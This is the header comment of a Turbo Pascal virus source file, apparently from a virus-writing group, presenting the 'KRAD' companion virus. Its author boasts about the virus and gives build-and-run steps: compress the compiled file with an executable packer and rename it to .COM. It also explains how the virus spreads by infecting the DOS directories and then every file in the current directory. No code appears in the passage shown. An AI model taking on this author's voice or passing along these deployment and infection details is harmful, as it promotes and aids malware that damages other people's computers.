{       Virus Laboratories and Distribution
          Proudly present the KRAD Virus                                      
     Written by Metabolis for non assembler ppls                              
                                                                              
          Why call it the KRAD virus?  Cos it is!  A companion virus          
          written in Turbo Pascal, well that just sums it up.  I wrote        
          this for two reasons.. 1) Not everyone knows assembler 2)           
          a friend reckoned a virus couldn't be programmed in Turbo           
          Pascal.. (by that he meant *I* couldn't do it).  No matter          
          how lame.. it's still a virus!  (Right up there with Aids/          
          Number 1 :))  Fully commented for non understanding Pascal          
          people, (a very small part of the world).                           
                                                                              
          Compress this with DIET/PkLite/LZEXE or something similar           
          when it's compiled.  Then rename it to a .COM file and hey          
          presto, you can run it!  I guess an added bonus of this             
          virus is, if there's another companion virus on your system         
          it won't overwrite it, it will take that as an infection            
          and leave it alone.                                                 
                                                                              
          KRAD virus will immediately infect C:\DOS or C:\MSDOS if            
          they exist, so if any DOS .EXE files are run it will infect         
          all the files in the current dir that you ran the DOS               
          command from. }
